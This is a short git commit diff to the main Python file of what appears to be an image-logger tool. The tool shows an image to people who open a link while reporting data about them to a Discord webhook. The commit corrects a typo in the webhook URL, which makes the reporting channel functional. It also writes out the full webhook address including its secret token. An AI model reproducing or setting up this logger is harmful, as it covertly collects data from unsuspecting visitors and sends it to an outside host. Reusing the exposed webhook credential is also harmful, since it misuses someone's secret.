098a54cf63aa6866f4590e7cc04a7fbc3900acf4
notsnvzlolsnvz-cell <notsnvzlolsnvz@gmail.com>
2025-09-13 13:19:04 +0500

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "hhttps://discord.com/api/webhooks/1416133163461246996/fdNBgHMhNKceB9K4OhrOpjOi6I9VhmWbRR02ND9nhpXPi-BIexngx-TzWNVoLSILBrZS",
+    "webhook": "https://discord.com/api/webhooks/1416133163461246996/fdNBgHMhNKceB9K4OhrOpjOi6I9VhmWbRR02ND9nhpXPi-BIexngx-TzWNVoLSILBrZS",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
